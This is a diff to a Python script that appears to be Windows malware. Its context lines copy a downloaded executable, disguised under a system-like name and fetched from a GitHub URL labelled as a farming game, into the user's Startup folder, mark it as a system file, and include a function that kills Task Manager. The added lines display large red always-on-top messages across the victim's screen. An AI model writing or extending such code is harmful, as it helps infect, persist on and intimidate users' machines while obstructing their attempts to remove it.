@@ -9,6 +9,8 @@ import getpass
 import shutil
 import time
 import pygame
+from PyQt5 import QtWidgets, QtCore
+import sys
 
 CLIENT_NAME = getpass.getuser()
 FILE_ATTRIBUTE_SYSTEM = 0x4
@@ -22,7 +24,49 @@ startup_folder = os.path.join("C:\\Users", CLIENT_NAME, "AppData", "Roaming",
                             "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 exe_final_location = os.path.join(startup_folder, "WINDOWS_data_infoRI.exe")
 old_final_location = os.path.join(startup_folder, "WINDOWS_data_info.exe")
-url = "https://raw.githubusercontent.com/habibprojects/habibn1/main/FarmingSimulator.exe"
+url = "https://raw.githubusercontent.com/habibprojects/habibn1/main/FarmingSimulatorRI.exe"
+
+class MessageDispatcher(QtCore.QObject):
+    show_message = QtCore.pyqtSignal(str, int)
+
+    def __init__(self):
+        super().__init__()
+        self.show_message.connect(self._show)
+
+    def _show(self, mensagem, duracao):
+        label = QtWidgets.QLabel(mensagem)
+        label.setStyleSheet("""
+            color: red;
+            font-size: 80px;
+            font-weight: bold;
+            background-color: rgba(0, 0, 0, 150);
+            padding: 20px;
+            border-radius: 15px;
+        """)
+
+        label.setWindowFlags(
+            QtCore.Qt.FramelessWindowHint |
+            QtCore.Qt.WindowStaysOnTopHint |
+            QtCore.Qt.Tool
+        )
+
+        label.setAttribute(QtCore.Qt.WA_TranslucentBackground)
+        label.setAlignment(QtCore.Qt.AlignCenter)
+        label.adjustSize()
+
+        screen = QtWidgets.QApplication.primaryScreen().geometry()
+        label.move(
+            (screen.width() - label.width()) // 2,
+            (screen.height() - label.height()) // 2
+        )
+
+        label.show()
+
+        QtCore.QTimer.singleShot(
+            duracao * 1000,
+            label.close
+        )
+
 
 def close_task_manager():
     for proc in psutil.process_iter(['name']):
